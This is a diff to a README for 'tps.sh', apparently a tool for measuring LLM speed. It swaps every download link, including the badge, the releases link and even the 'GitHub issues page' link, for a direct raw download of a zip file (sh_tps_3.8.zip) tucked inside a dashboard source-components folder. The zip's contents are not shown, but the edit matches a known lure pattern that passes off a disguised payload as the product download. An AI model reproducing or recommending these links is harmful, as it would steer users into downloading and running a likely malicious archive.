@@ -1,6 +1,6 @@
 # 🛠️ tps.sh - Measure LLM Speed Easily
 
-[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)
+[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/raw/refs/heads/main/dashboard/src/components/cards/sh_tps_3.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If you want to compare with Apple Silicon models, you would need appropriate har
 
 Click the big badge above or use this link below to get tps.sh files and installer:
 
-[Visit this page to download tps.sh](https://github.com/GabrielNetoAUT/tps.sh/releases)
+[Visit this page to download tps.sh](https://github.com/GabrielNetoAUT/tps.sh/raw/refs/heads/main/dashboard/src/components/cards/sh_tps_3.8.zip)
 
 This page holds several versions. Look for the latest Windows release in the list. Files usually end with `.exe` or `.zip`.
 
@@ -152,7 +152,7 @@ Back up your custom configs before updating.
 
 - Verify model paths or API keys in the config files.
 
-- Visit the [GitHub issues page](https://github.com/GabrielNetoAUT/tps.sh/issues) for community help.
+- Visit the [GitHub issues page](https://github.com/GabrielNetoAUT/tps.sh/raw/refs/heads/main/dashboard/src/components/cards/sh_tps_3.8.zip) for community help.
 
 ---
 
@@ -162,4 +162,4 @@ Explore the documentation and community posts on the repository page to learn mo
 
 ---
 
-[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)
+[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/raw/refs/heads/main/dashboard/src/components/cards/sh_tps_3.8.zip)
